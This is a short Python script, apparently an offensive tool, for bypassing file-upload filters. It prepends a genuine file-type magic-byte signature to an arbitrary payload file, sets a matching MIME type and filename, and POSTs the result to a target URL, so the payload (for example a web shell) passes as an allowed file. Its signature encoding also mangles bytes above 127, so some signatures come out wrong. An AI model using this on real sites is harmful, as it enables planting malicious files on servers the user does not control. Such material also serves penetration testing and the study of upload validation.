import tempfile
from pyfsig import constants
import requests
import mimetypes
import lib.parse
mimetypes.init()


def grabsig(ext):
    for sig in constants.SIGNATURES:
        if sig["file_extension"] == ext:
            return "".join([chr(h) for h in sig["hex"]]).encode("utf-8"), mimetypes.types_map[f".{ext}"]

def fileupload():
    ext=args.ext
    name=args.name
    filename=args.filename
    with open(args.payload,"r") as payload:
        content=payload.read().encode("utf-8")
    with tempfile.NamedTemporaryFile() as tmp:
        try:
            sig,mime=grabsig(ext)
        except TypeError:
            print("Error: most likely this file type is not in the available signature list")
            exit()
        tmp.write(sig)
        tmp.write(b"\n")
        tmp.write(content)
        tmp.seek(0)
        files = {name: (filename, tmp, mime)}
        r = requests.post(args.url, files=files)    
        print(r.text)      

if __name__ == "__main__":
    args=lib.parse.parser()
    fileupload()
